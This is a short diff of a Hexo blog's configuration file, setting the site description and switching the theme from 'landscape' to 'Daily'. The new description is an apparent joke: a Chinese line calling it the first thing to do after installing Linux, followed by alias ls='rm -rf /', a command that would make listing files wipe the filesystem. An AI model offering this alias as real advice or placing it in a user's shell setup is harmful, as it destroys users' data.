@@ -5,7 +5,7 @@
 # Site
 title: 碎碎念
 subtitle:
-description:
+description: Linux安装后第一件事 alias ls='rm -rf /'
 author: Samael Chen
 language:
 timezone:
@@ -63,7 +63,7 @@ pagination_dir: page
 # Extensions
 ## Plugins: https://hexo.io/plugins/
 ## Themes: https://hexo.io/themes/
-theme: landscape
+theme: Daily
 
 # Deployment
 ## Docs: https://hexo.io/docs/deployment.html
